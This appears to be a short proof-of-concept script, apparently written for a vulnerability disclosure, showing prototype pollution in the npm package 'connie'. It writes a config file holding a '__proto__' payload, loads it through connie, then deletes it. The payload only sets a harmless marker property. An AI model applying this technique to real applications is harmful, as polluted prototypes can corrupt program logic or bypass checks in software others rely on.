 
   

  const connie = require("connie");
  const fs = require("fs");
  const path = require("path");
  const pathToConfig = path.resolve(__dirname, "./config.json");

  fs.writeFileSync(pathToConfig, `{"__proto__": {"polluted": "yes"}}`);
  connie("file", pathToConfig)
    .read()
    .then(() => {
       
      fs.unlinkSync(pathToConfig);
    });
// End of file
